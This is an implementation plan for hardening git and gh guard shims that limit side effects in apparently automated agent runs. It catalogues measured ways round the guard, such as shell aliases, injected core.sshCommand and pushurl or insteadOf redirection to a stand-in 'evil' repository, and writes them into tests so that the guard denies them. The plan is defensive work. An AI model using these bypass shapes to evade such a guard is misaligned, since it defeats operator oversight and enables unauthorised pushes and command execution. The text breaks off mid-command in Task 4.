# Side-Effect Shim — Close Alias, Env-Config and Transport-Override Bypasses — Implementation Plan

**Issue:** #553

**Spec:** `docs/superpowers/specs/2026-11-21-side-effect-shim-alias-bypass-design.md`

**Goal:** Make `scripts/shims/git` and `scripts/shims/gh` judge what git/gh would
*actually* run, not just the literal argv verb. The spec's twelve measured bypass shapes
(items 1-12) are denied: aliases however defined, alias arguments, shell aliases, external
`git-<verb>` commands, unknown global options, `core.sshCommand`/`GIT_SSH*`, level-4 push
redirection, `gh` aliases, a `gh` flag before the command, and `gh` extensions. Nothing a
factory run legitimately does is denied, and the level tables in
`scripts/factory_core/side_effect.py` do not change.

**Architecture:** Both shims keep their existing classification byte-for-byte and gain a
resolution pass at the point of today's final `exec`, i.e. only after the literal form has
passed (tighten-only invariant, spec R2). For an unknown verb, the git shim asks real git:
`--list-cmds=main`/`others`, then `config --get alias.<verb>` with the same global options
and the inherited env, minus `GIT_CONFIG`. It then re-invokes itself in a classify-only
mode on the expanded argv, depth cap 5, so the literal and the expanded form go through
identical code. The gh shim does the same with `gh alias list`. Two new shim-local checks
sit beside it: a transport-override deny (git, every level) and an installed-extension
deny (gh, levels 1-4). At `push_scope=own_branch_only` one more check compares every
`remote get-url --push --all` URL with `https://github.com/${FACTORY_REPO_SLUG}`. Every new
lookup fails closed. What is exec'd is always the untouched original argv.

**Tech Stack:** bash 5 (the image has 5.3; `set -euo pipefail`), real `git` ≥ 2.32
(`GIT_CONFIG_GLOBAL`, `--list-cmds`, `init -b`) and real `gh` 2.x (YAML `alias list`).
Both are on GitHub's `ubuntu-latest` and in the factory image (git 2.53.0, gh 2.105.0).
Plus `jq` and the existing `tests/test_side_effect_shims.sh` harness, which CI already runs
(`.github/workflows/ci.yml`).

**How this plan was validated:** every code block below was applied to a scratch copy of
this checkout and run, task by task. Each "Expected" count is the measured output, not an
estimate. An end-to-end run with real git and real pushes to local bare repos confirmed
the headline vectors are denied with no ref change on either remote. `git status` through
the patched shim takes about 60 ms, and `gh issue view` at level 4 about 0.3 s including
the two extra gh lookups.

## File Structure

| File | Change | Responsibility |
|---|---|---|
| `scripts/shims/git` | Modify (+~150 lines) | Global-option capture, classify-only guard, `GIT_CONFIG`-free config helper; verb resolution (syntax / known-verb / external / alias / shell-alias / quoting / depth) with self re-invocation; transport-override deny; level-4 `--repo` capture and push-destination check |
| `scripts/shims/gh` | Modify (+~60 lines) | Numeric level; classify-only guard; `_finish` (flag-before check, `gh alias list` resolution with self re-invocation, extension deny at levels 1-4) replacing the three final `exec`s |
| `tests/test_side_effect_shims.sh` | Modify (+~225 lines) | Real-lookup stubs, fixture repo + hermetic env, `check_deny_reason`, 121 new assertions (113 existing stay byte-identical) |
| `docs/adapter-authoring-guide.md` | Modify | `## Side-effect levels`: what the shim now resolves and denies; "PATH guard, not a sandbox" with the out-of-reach list (spec R8) |

Not touched: `scripts/factory_core/side_effect.py` (spec R7), `deploy/**`,
`.github/workflows/**`, `config/**`, the Dockerfile. The shims are already baked from
`scripts/shims/`.

Size: about 440 changed lines in total, about 215 of them in the two shims. The spec
estimated it would fit "well inside" the 400-line convention. The shim code alone does,
and the overrun is test cases the spec's test plan requires. This is recorded, not trimmed.

## Spec → task traceability

| Spec item / requirement | Task |
|---|---|
| R2 git: items 1, 2, 3 (alias via `-c`, persisted, env-var), 9 (args in value), 10 (non-bare value / invalid key), 11 (external `git-<verb>`), 12 (unknown global option); tighten-only invariant; depth cap | 2 |
| R3: shell alias (item 4) — denied at every level | 2 (alias-value check) |
| R3: `core.sshCommand`/`GIT_SSH_COMMAND`/`GIT_SSH`, every level (checked on every verb) | 3 |
| R4: level-4 destination (`pushurl`, `insteadOf`/`pushInsteadOf`, other remote, literal URL, `--repo`, remote-selection order, slug baseline + degraded fallback) | 4 |
| R2 gh: items 6 (gh alias), 12 (`gh -R o/r pr create`); R5: item 7 (extensions, levels 1-4) | 5 |
| R6: item 8 `gh api` body-without-method regression pin | 6 |
| Test plan "Legitimate usage" + operator decision 2 known-verb pin | 6 |
| R8 docs | 7 |
| R7 (`side_effect.py` untouched), hard limits | 8 |
| R1 / R9.1 nested-child class: documented residual only, not fixed | 7 (docs) |

## Decisions and deviations from the spec (flagged for the plan gate)

1. **`GIT_CONFIG` is dropped for the shim's own `git config` lookups** (`_git_config`). The
   spec says to inherit the environment unchanged. But `GIT_CONFIG` is read *only* by the
   `git config` command, which then reads that one file instead of the normal config
   sources, and never by the command being judged. Measured: `GIT_CONFIG=<decoy with
   alias.p=log> git -c alias.p=push config --get alias.p` prints `log`, while `git p` runs
   `push`. `GIT_CONFIG=/dev/null` likewise hides `-c core.sshCommand=x`. Inheriting it would
   reopen R2 and R3. Two tests pin this (Task 2, Task 3). This tightens only.
2. **The test stub hands `symbolic-ref` to real git** (the spec listed it among the echoed
   calls). It is needed for the no-refspec `--repo`/`remote.pushDefault` destination cases.
   No existing assertion is affected (Task 1 note, measured 113/113).
3. **The transport-override deny runs on every verb**, not only the spec's example list of
   transport verbs (Task 3 note). Architect cycle 1 measured `archive --remote` and
   `maintenance run --task=prefetch` executing an injected `core.sshCommand` under a
   list-gated check. This is a superset in the tighten-only direction, and an empty-but-set
   `GIT_SSH*` also counts as an override.
4. **`gh ext` / `gh extensions`** are treated as `gh extension` (cobra aliases, measured).
5. **`git lfs` test regex** accepts `unknown verb|external git command`. git-lfs is
   preinstalled on GitHub's ubuntu runners but absent from the image. Either way it is
   denied, per operator decision 2.
6. **Fallback test** uses `FACTORY_REPO_SLUG=` (empty, treated as unset) so the counters
   stay in-process.
7. **Classify-only marker from the caller's environment is denied** (`SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1`
   at depth 0). It is not a spec item: an implementation detail of the spec's
   self-re-invocation approach, made fail-loud (Tasks 2 and 5).
8. **`git -v`** is now denied as an unrecognised option (Task 2 note). `git --version` is
   unchanged.
9. **Additional destination cases** beyond the spec's list: `push --repo=<other>` with no
   positional repository (the spec's prototype note says this was measured but it is not
   in the test list) and `remote.pushDefault` → other remote. Both test R4's "which remote"
   order directly.

## Memory lessons applied

- Shell aliases, hooks, pager, editor and credential helpers run with git's exec-path ahead
  of the shim on `PATH` (`.archon/memory/architecture.md`, #553). So shell aliases are
  denied outright, never inspected (Task 2), and the nested-child class is documented, not
  "fixed" by recursion (Task 7).
- Two-dot `git diff origin/main HEAD` for scope checks (`codebase-patterns.md`): Task 8.4.
- The spec stays at its durable `docs/superpowers/specs/` path. A later archive step moves
  only this plan (`codebase-patterns.md`, #42/#215).

## Tasks


### Task 1: Test harness: real-lookup stubs, fixture repo, reason-asserting deny helper

No behavior change. This task makes the harness able to run the new lookups. Without it,
every new lookup in Tasks 2-5 would get `REAL_GIT …` at exit 0 from the echo stubs and
every allow assertion would deny.

**Files:**
- Modify: `tests/test_side_effect_shims.sh`

- [ ] **Step 1.1: Replace the stub block with real-lookup stubs and add the fixture.**

In `tests/test_side_effect_shims.sh`, find this exact text:

```bash
# Real binary stubs the shim must exec through when allowed.
mkdir -p "$TMP/real"
cat > "$TMP/real/git" <<'EOF'
#!/usr/bin/env bash
echo "REAL_GIT $*"
EOF
cat > "$TMP/real/gh" <<'EOF'
#!/usr/bin/env bash
echo "REAL_GH $*"
EOF
chmod +x "$TMP/real/git" "$TMP/real/gh"

SHIM_DIR="$REPO_ROOT/scripts/shims"
export PATH="$SHIM_DIR:$TMP/real:$PATH"
```

Replace it with:

```bash
# #553: the shims now ask real git/gh what a verb resolves to (aliases, push URLs,
# extensions), so the stubs hand exactly those read-only lookups to the real binaries --
# found on PATH, skipping any side-effect shim (this script also runs inside factory
# containers, where the shim is first on PATH) -- and echo every other call as before.
_find_real() {
  local p
  for p in $(type -ap "$1"); do
    grep -q "side-effect guard" "$p" 2>/dev/null || { echo "$p"; return 0; }
  done
  return 1
}
REAL_GIT_BIN=$(_find_real git) || { echo "FAIL: no real git on PATH"; exit 1; }
REAL_GH_BIN=$(_find_real gh) || { echo "FAIL: no real gh on PATH"; exit 1; }

# Real binary stubs the shim must exec through when allowed.
mkdir -p "$TMP/real"
cat > "$TMP/real/git" <<EOF
#!/usr/bin/env bash
args=("\$@"); i=0
while [ "\$i" -lt "\${#args[@]}" ]; do
  case "\${args[\$i]}" in
    --list-cmds=*) exec "$REAL_GIT_BIN" "\$@" ;;
    -C|-c|--git-dir|--work-tree|--namespace|--config-env) i=\$((i + 2)) ;;
    -*) i=\$((i + 1)) ;;
    *) break ;;
  esac
done
case "\${args[\$i]:-} \${args[\$((i + 1))]:-}" in
  "config "*|"remote get-url"|"symbolic-ref "*) exec "$REAL_GIT_BIN" "\$@" ;;
esac
echo "REAL_GIT \$*"
EOF
cat > "$TMP/real/gh" <<EOF
#!/usr/bin/env bash
case "\${1:-} \${2:-}" in
  "alias list"|"extension list") exec "$REAL_GH_BIN" "\$@" ;;
esac
echo "REAL_GH \$*"
EOF
chmod +x "$TMP/real/git" "$TMP/real/gh"

SHIM_DIR="$REPO_ROOT/scripts/shims"
export PATH="$SHIM_DIR:$TMP/real:$PATH"

# #553 fixture: a real repo whose origin is the run's repository (o/r), so the level-4
# push-destination check has something to resolve, independent of the checkout this
# test runs from. No developer/runner config, gh alias, extension, token or SSH
# override leaks in.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
export GH_CONFIG_DIR="$TMP/gh-config" XDG_DATA_HOME="$TMP/xdg-data"
mkdir -p "$GH_CONFIG_DIR" "$XDG_DATA_HOME"
unset GH_TOKEN GITHUB_TOKEN GIT_SSH GIT_SSH_COMMAND GIT_CONFIG GIT_CONFIG_COUNT \
  GIT_CONFIG_PARAMETERS GIT_DIR GIT_WORK_TREE || true
export FACTORY_REPO_SLUG=o/r
"$REAL_GIT_BIN" init -q -b feat "$TMP/repo"
"$REAL_GIT_BIN" -C "$TMP/repo" remote add origin https://github.com/o/r.git
cd "$TMP/repo"
```

Notes:
- The heredocs are now unquoted (`<<EOF`) so `$REAL_GIT_BIN`/`$REAL_GH_BIN` are baked in.
  Every other `$` is escaped and survives into the stub.
- `symbolic-ref` is handed to real git as well. The spec's harness description echoed it;
  this plan passes it through because the `--repo` and `remote.pushDefault`
  destination cases in Task 4 push with no refspec, so the shim judges `HEAD`. In the
  fixture `HEAD` is `feat`, which equals the pinned `FACTORY_RUN_BRANCH`. No existing
  assertion reaches `symbolic-ref`: every level-4 row pins `FACTORY_RUN_BRANCH` and either
  names its target or is denied first by a `--all`/`--mirror`/`--tags`/tag-ref rule.
  Measured: 113/113 still pass.
- `cd "$TMP/repo"` runs after `REPO_ROOT`/`SHIM_DIR` are computed, so every absolute path
  above it still holds.

- [ ] **Step 1.2: Add the `check_deny_reason` helper.**

In `tests/test_side_effect_shims.sh`, find this exact text:

```bash
PASS=0; FAIL=0
check() {
```

Replace it with:

```bash
PASS=0; FAIL=0
check_deny_reason() {
  # usage: check_deny_reason <ERE the deny message must match> <cmd...> -- #553: a new
  # deny case must be denied for its own reason, not by some unrelated check.
  local re="$1"; shift
  local out rc
  set +e
  out=$("$@" 2>&1)
  rc=$?
  set -e
  if [ "$rc" != "0" ] && echo "$out" | grep -q "side-effect guard" && echo "$out" | grep -qE -- "$re"; then
    PASS=$((PASS+1))
  else
    echo "FAIL (expected deny /$re/): $* -> rc=$rc out=$out"; FAIL=$((FAIL+1))
  fi
}
check() {
```

- [ ] **Step 1.3: Add the (empty) #553 section.** In `tests/test_side_effect_shims.sh`,
  insert this immediately **above** the line `# --- Health-event emission on denial (R5's {tool, verb, level} audit line) ---`:

```bash
# --- #553: alias, env-config, transport-override and destination bypass shapes ---
# Every new deny asserts its reason (check_deny_reason), so a case cannot pass because an
# unrelated check denied it. All run in the $TMP/repo fixture (origin = o/r, branch feat).
export FACTORY_RUN_BRANCH="feat"
# --- end #553 cases ---
unset FACTORY_RUN_BRANCH
```

Tasks 2-6 each insert their block above `# --- end #553 cases ---`, so the blocks end up in
task order.

- [ ] **Step 1.4: Run the suite on the unchanged shims.**

```bash
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=113 FAIL=0` (byte-identical existing assertions, all passing).

- [ ] **Step 1.5: Commit.**

```bash
git add tests/test_side_effect_shims.sh
git commit -m "test(shims): real-lookup stubs, fixture repo and reason-asserting deny helper (#553)"
```


### Task 2: git: resolve the verb git would actually run (spec R2: items 1-3, 9-12)

**Files:**
- Modify: `tests/test_side_effect_shims.sh`
- Modify: `scripts/shims/git`

- [ ] **Step 2.1: Write the failing tests.**

In `tests/test_side_effect_shims.sh`, insert this block immediately **above** the line `# --- end #553 cases ---`:

```bash
# Alias sources: however the alias is defined, `p` is judged as `push` (level 2 denies push).
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -c alias.p=push p origin HEAD
"$REAL_GIT_BIN" config alias.pp push
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git pp origin HEAD
"$REAL_GIT_BIN" config --unset alias.pp
GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push \
  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git p origin HEAD
GIT_CONFIG_PARAMETERS="'alias.p'='push'" \
  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git p origin HEAD
printf '[alias]\n\tp = push\n' > "$TMP/alias.gitconfig"
GIT_CONFIG_GLOBAL="$TMP/alias.gitconfig" \
  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git p origin HEAD
ALIAS_VALUE=push FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" \
  git --config-env=alias.ce=ALIAS_VALUE ce origin HEAD
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" \
  git -c alias.a1=a2 -c alias.a2=push a1 origin HEAD
# GIT_CONFIG redirects only `git config` itself: a decoy file must not hide the real alias.
printf '[alias]\n\tp = log\n' > "$TMP/decoy.gitconfig"
GIT_CONFIG="$TMP/decoy.gitconfig" \
  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -c alias.p=push p origin HEAD
# The classify-only marker is the shim's own; from the caller's environment it is denied.
SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1 FACTORY_SIDE_EFFECT_LEVEL=5 \
  check_deny_reason "outside a nested check" git status
# Depth cap: five hops resolve, six deny.
FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c alias.h1=h2 -c alias.h2=h3 -c alias.h3=h4 \
  -c alias.h4=h5 -c alias.h5=status h1
FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "too deep" git -c alias.h1=h2 -c alias.h2=h3 \
  -c alias.h3=h4 -c alias.h4=h5 -c alias.h5=h6 -c alias.h6=status h1
# Shell aliases are unclassifiable -- denied at every level.
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "shell alias" git -c 'alias.s=!git push origin HEAD' s
FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "shell alias" git -c 'alias.s=!git push --delete origin feat' s
# Arguments inside the alias value are judged too.
FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "push --delete" git -c 'alias.del=push --delete' del origin feat
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "push --force" git -c 'alias.x=push --force' x origin feat
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "push \(main\)" git -c 'alias.x=push origin' x HEAD:main
# Tighten-only: the literal form is still judged first (`l` is not on level 1's allow-list).
FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "'l' is denied" git -c alias.l=log l
FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "'l' is denied" git -c 'alias.l=log --output=f' l
# Alias values that are not a bare verb.
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -c 'alias.v=-p push' v origin HEAD
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "shell-style parsing" git -c 'alias.w="push"' w origin HEAD
# Global options the skip-loop does not know are denied, not read as the verb.
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "unrecognised option" git --no-advice push origin HEAD
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "unrecognised option" git --attr-source HEAD push origin HEAD
FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "unrecognised option" git --no-advice status
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -C . --git-dir=.git --no-pager push origin HEAD
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "push --force" git push -fu origin feat
# Unknown verbs and external git-<verb> commands. (git-lfs is preinstalled on GitHub's
# ubuntu runners but not in the factory image, so `lfs` may surface as either reason.)
FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "unknown verb" git frobnicate
FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "unknown verb|external git command" git lfs push origin feat
mkdir -p "$TMP/ext-bin"
printf '#!/bin/sh\necho EXTERNAL "$@"\n' > "$TMP/ext-bin/git-evilx"; chmod +x "$TMP/ext-bin/git-evilx"
PATH="$SHIM_DIR:$TMP/ext-bin:$TMP/real:$PATH" FACTORY_SIDE_EFFECT_LEVEL=2 \
  check_deny_reason "external git command" git -c alias.evilx=status evilx
FACTORY_SIDE_EFFECT_LEVEL=5 check allow git submodule status
# Controls: legitimate aliases and global options keep working.
FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c alias.p=push p origin feat
FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c 'alias.lg=log --oneline' lg
FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c alias.status=push status   # a known verb never resolves
FACTORY_SIDE_EFFECT_LEVEL=2 check allow git -C . -c user.name=x commit -m x
FACTORY_SIDE_EFFECT_LEVEL=2 check allow git --no-pager -C . diff --name-only
FACTORY_SIDE_EFFECT_LEVEL=2 check allow git --git-dir=.git status
```

- [ ] **Step 2.2: Run the suite; verify the new cases fail.**

```bash
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=125 FAIL=23`. The 23 `FAIL (expected deny …)` lines are every new deny in
the block except `git push -fu origin feat`, which the existing cluster expansion already
denies. All 8 new allow controls pass.

- [ ] **Step 2.3: Add the global-option capture, the classify-only guard and the
  `GIT_CONFIG`-free config helper.**

In `scripts/shims/git`, find this exact text:

```bash
VERB_ARGS=("${_ARGS[@]:$((_I + 1))}")   # everything after the verb (push flag parsing)

# Version/help never mutate anything.
case "$VERB1" in --version|--help|-h|help|version) exec "$REAL_GIT" "$@" ;; esac
```

Replace it with:

```bash
VERB_ARGS=("${_ARGS[@]:$((_I + 1))}")   # everything after the verb (push flag parsing)
# #553: the global options exactly as given, so every lookup below (alias, push URL,
# sshCommand) asks real git with the same -c/--config-env/-C/--git-dir the invocation
# itself will run with.
_GLOBAL_OPTS=("${_ARGS[@]:0:$_I}")

# #553: a nested classify-only run (an alias expansion being judged, see the end of this
# file) must never exec anything -- it only reports deny (exit 1) or pass (exit 0).
_CLASSIFY_ONLY="${SIDE_EFFECT_SHIM_CLASSIFY_ONLY:-}"
# Only this shim sets it, always with a depth >= 1. At depth 0 it came from the caller's
# own environment: fail loudly rather than silently do nothing on every call.
if [ "$_CLASSIFY_ONLY" = "1" ] && [ "${SIDE_EFFECT_SHIM_DEPTH:-0}" = "0" ]; then
  deny "SIDE_EFFECT_SHIM_CLASSIFY_ONLY outside a nested check"
fi

# Version/help never mutate anything.
case "$VERB1" in --version|--help|-h|help|version)
  [ "$_CLASSIFY_ONLY" = "1" ] && exit 0
  exec "$REAL_GIT" "$@" ;;
esac

# #553: `git config` reads only the file named by GIT_CONFIG when that is set, while the
# real command ignores it -- so a lookup that inherited it could be shown a decoy alias or
# no sshCommand. Every config lookup the shim makes drops it; nothing else is changed.
_git_config() { env -u GIT_CONFIG "$REAL_GIT" "${_GLOBAL_OPTS[@]}" config "$@"; }
```

- [ ] **Step 2.4: Add the resolution pass before the final `exec`.**

In `scripts/shims/git`, find this exact text:

```bash
  esac
fi

exec "$REAL_GIT" "$@"
```

Replace it with:

```bash
  esac
fi

# #553 / spec Requirement 2: the verb judged above is the literal token; git may run
# something else under that name (an alias from -c, --config-env, GIT_CONFIG_* env or any
# config file, or a git-<verb> on PATH). The literal form has passed; now every expanded
# form must pass the same classification too (tighten-only), at every level. Each check
# fails closed. What is exec'd at the bottom is still the untouched "$@".
_DEPTH="${SIDE_EFFECT_SHIM_DEPTH:-0}"
case "$_DEPTH" in ''|*[!0-9]*) deny "${VERB1:-git} (alias chain depth)" ;; esac
if [ -n "$VERB1" ]; then
  # Anything the skip-loop above does not know (`--no-advice`, `--attr-source HEAD`)
  # lands here instead of a verb; deny it rather than read the option as the verb.
  [[ "$VERB1" =~ ^[a-z][a-z0-9-]*$ ]] || deny "$VERB1 (unrecognised option or verb syntax)"
  _KNOWN=$("$REAL_GIT" --list-cmds=main 2>/dev/null) && [ -n "$_KNOWN" ] \
    || deny "$VERB1 (verb resolution failed)"
  # A known command never consults aliases (git does not let an alias shadow one).
  if ! grep -qxF -- "$VERB1" <<<"$_KNOWN"; then
    _OTHERS=$("$REAL_GIT" --list-cmds=others 2>/dev/null) || deny "$VERB1 (verb resolution failed)"
    # git runs a git-<verb> found on PATH before an alias of that name, and the child
    # gets git's exec-path ahead of this shim on its PATH -- unclassifiable.
    grep -qxF -- "$VERB1" <<<"$_OTHERS" && deny "$VERB1 (external git command)"
    [ "$_DEPTH" -lt 5 ] || deny "$VERB1 (alias chain too deep)"
    _RC=0
    _VALUE=$(_git_config --get "alias.${VERB1}" 2>/dev/null) || _RC=$?
    # Exit 1 is also what an invalid key returns, so it can never mean "safe".
    case "$_RC" in
      0) : ;;
      1) deny "$VERB1 (unknown verb)" ;;
      *) deny "$VERB1 (alias resolution failed)" ;;
    esac
    # A shell alias has no verb to judge, and git runs its body with git's exec-path
    # first on PATH, so a nested `git push` in it would reach real git (spec item 4).
    case "$_VALUE" in '!'*) deny "$VERB1 (shell alias)" ;; esac
    case "$_VALUE" in
      *[\"\'\\]*|*$'\n'*) deny "$VERB1 (alias value needs shell-style parsing)" ;;
    esac
    read -ra _EXPANSION <<<"$_VALUE"
    [ "${#_EXPANSION[@]}" -gt 0 ] || deny "$VERB1 (empty alias)"
    # Re-run this whole shim, classify-only, on the expanded argv: identical code judges
    # the literal and the expanded form, and alias chains recurse with the depth cap.
    SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1 SIDE_EFFECT_SHIM_DEPTH=$((_DEPTH + 1)) \
      "$SHIM_DIR/git" "${_GLOBAL_OPTS[@]}" "${_EXPANSION[@]}" "${VERB_ARGS[@]}" || exit $?
  fi
fi

[ "$_CLASSIFY_ONLY" = "1" ] && exit 0
exec "$REAL_GIT" "$@"
```

Implementation notes (all measured with the prototype):
- `deny` is never called inside `$(…)`, because `exit` would leave only the subshell. Every
  lookup captures into a variable and denies in the parent shell (`|| deny`, or a
  `case "$_RC"`).
- Self re-invocation (`"$SHIM_DIR/git"` with `SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1`) is the
  spec's suggested mechanism. The literal and the expanded form go through identical code,
  with no 160-line re-indent into a function. The marker is only ever set together with a
  depth ≥ 1. Seen at depth 0 it came from the caller's environment and is denied
  (`outside a nested check`, tested), so it can never silently turn every git call into a
  no-op that strands a headless run (architect cycle 1 advisory). A non-numeric
  `SIDE_EFFECT_SHIM_DEPTH` is denied, and a large one denies every alias (fails closed).
- `git -v` (git's short `--version`) is now denied as an unrecognised option at every level.
  The spec keeps the version/help passthrough unchanged, and widening it would loosen level
  1. Agents use `git --version`, which still passes.
- The expanded argv is `<global options> <alias tokens> <VERB_ARGS>`. A leading option in
  the value (`-p push`) is re-parsed by the child's own skip-loop.

- [ ] **Step 2.5: Run the suite; verify it passes.**

```bash
bash -n scripts/shims/git && env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=148 FAIL=0`.

- [ ] **Step 2.6: Commit.**

```bash
git add scripts/shims/git tests/test_side_effect_shims.sh
git commit -m "fix(shim/git): judge the alias expansion, deny shell/external/unknown verbs (#553)"
```


### Task 3: git: deny transport-command overrides at every level (spec R3: item 5, sshCommand half)

**Files:**
- Modify: `tests/test_side_effect_shims.sh`
- Modify: `scripts/shims/git`

- [ ] **Step 3.1: Write the failing tests.**

In `tests/test_side_effect_shims.sh`, insert this block immediately **above** the line `# --- end #553 cases ---`:

```bash
# Transport-command overrides: denied at every level, whatever the source.
FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" git -c core.sshCommand=x push origin feat
GIT_SSH_COMMAND=x FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" git fetch origin
GIT_SSH=x FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "sshCommand" git fetch origin
GIT_CONFIG=/dev/null FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" \
  git -c core.sshCommand=x fetch origin
# Not only the classic transport verbs: archive --remote and maintenance prefetch open one too.
FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" \
  git -c core.sshCommand=x archive --remote=ssh://h/x HEAD
GIT_SSH_COMMAND=x FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "sshCommand" \
  git maintenance run --task=prefetch
FACTORY_SIDE_EFFECT_LEVEL=5 check allow git push origin feat
FACTORY_SIDE_EFFECT_LEVEL=1 check allow git fetch origin
```

- [ ] **Step 3.2: Run; verify fail.**

```bash
env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=150 FAIL=6`. The six `sshCommand` denies fail and the two allow controls pass.

- [ ] **Step 3.3: Implement.**

In `scripts/shims/git`, find this exact text:

```bash
[ "$_CLASSIFY_ONLY" = "1" ] && exit 0
exec "$REAL_GIT" "$@"
```

Replace it with:

```bash
# #553 / spec Requirement 3, every level: a transport-command override splices an
# arbitrary command into an otherwise authorised push/fetch. Nothing in the factory uses
# one (HTTPS clone, gh credential helper), so it is denied outright. Checked on every
# verb, not a list of transport verbs: `archive --remote`, `maintenance run
# --task=prefetch` and a partial clone's lazy fetch open a transport from verbs such a
# list would miss. The reason names the override, not a level.
_V="${VERB1:-git}"
[ -n "${GIT_SSH_COMMAND+x}" ] && deny "$_V (sshCommand override: GIT_SSH_COMMAND)"
[ -n "${GIT_SSH+x}" ] && deny "$_V (sshCommand override: GIT_SSH)"
_RC=0
_git_config --get core.sshCommand >/dev/null 2>&1 || _RC=$?
case "$_RC" in
  0) deny "$_V (sshCommand override: core.sshCommand)" ;;
  1) : ;;
  *) deny "$_V (config lookup failed)" ;;
esac

[ "$_CLASSIFY_ONLY" = "1" ] && exit 0
exec "$REAL_GIT" "$@"
```

Note: the check runs on **every** verb, not only the spec's example list (`push fetch pull
clone ls-remote remote update submodule`). Architect review cycle 1 measured that a verb
list misses real transports: `git -c core.sshCommand='touch …' archive --remote=ssh://…`
and `git maintenance run --task=prefetch` ran the injected command with a list-gated
check. A partial clone's lazy fetch can open a transport from almost any read verb. The
spec's own rationale ("denying it everywhere costs nothing"; no factory run sets these)
covers the wider scope, which tightens only. An empty `GIT_SSH_COMMAND=` is also denied
(`${VAR+x}`), since set-but-empty is still an override signal.

- [ ] **Step 3.4: Run; verify pass.**

```bash
bash -n scripts/shims/git && env -u FACTORY_SIDE_EFFECT_LEVEL bash tests/test_side_effect_shims.sh 2>&1 | grep -E '^(PASS=|FAIL)' | sed 's/ -> .*//'
```

Expected: `PASS=156 FAIL=0`.

- [ ] **Step 3.5: Commit.**

```bash
git add scripts/shims/git tests/test_side_effect_shims.sh
git commit -m "fix(shim/git): deny core.sshCommand/GIT_SSH_COMMAND/GIT_SSH overrides on every verb (#553)"
```


### Task 4: git: level-4 push destination must be the run's repository (spec R4: item 5, pushurl/insteadOf half)

**Files:**
- Modify: `tests/test_side_effect_shims.sh`
- Modify: `scripts/shims/git`

- [ ] **Step 4.1: Write the failing tests.**

In `tests/test_side_effect_shims.sh`, insert this block immediately **above** the line `# --- end #553 cases ---`:

```bash
# Push destination at level 4: every push URL must be the run's repository (o/r).
FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push origin feat
FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push https://github.com/o/r.git feat
FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push --repo=origin
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
  git push https://github.com/evil/x.git feat
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
  git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
  git -c url.https://github.com/evil/.insteadOf=https://github.com/o/ push origin feat
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
  git -c remote.origin.pushurl=https://github.com/o/r.git \
  -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
  git push --repo=https://github.com/evil/x.git
FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
